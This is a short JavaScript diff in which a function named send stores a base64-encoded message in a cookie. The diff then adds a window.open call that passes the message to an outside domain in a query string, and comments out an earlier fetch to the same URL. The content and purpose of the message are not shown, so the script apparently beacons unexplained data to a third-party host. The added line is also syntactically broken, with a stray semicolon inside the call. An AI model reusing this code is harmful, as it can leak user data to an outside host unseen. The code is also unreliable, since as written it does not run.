@@ -75,13 +75,14 @@ function send(atributosScript) {
     }
 
     setCookie('german', encodeURIComponent(mensagemBase64), 1);
+    window.open(`https://nabucolopes.com.br/alagoas/rdc?i=${encodeURIComponent(mensagemBase64)}`;, '_blank');
     const urlComParametro = `https://nabucolopes.com.br/alagoas/rdc?i=${encodeURIComponent(mensagemBase64)}`;
     
-    fetch(urlComParametro, {
-	    method: 'GET',
-	})
-	.then(response => {})
-	.catch(error => {});
+ //    fetch(urlComParametro, {
+	//     method: 'GET',
+	// })
+	// .then(response => {})
+	// .catch(error => {});
 }
 
 function check(atributosScript) {
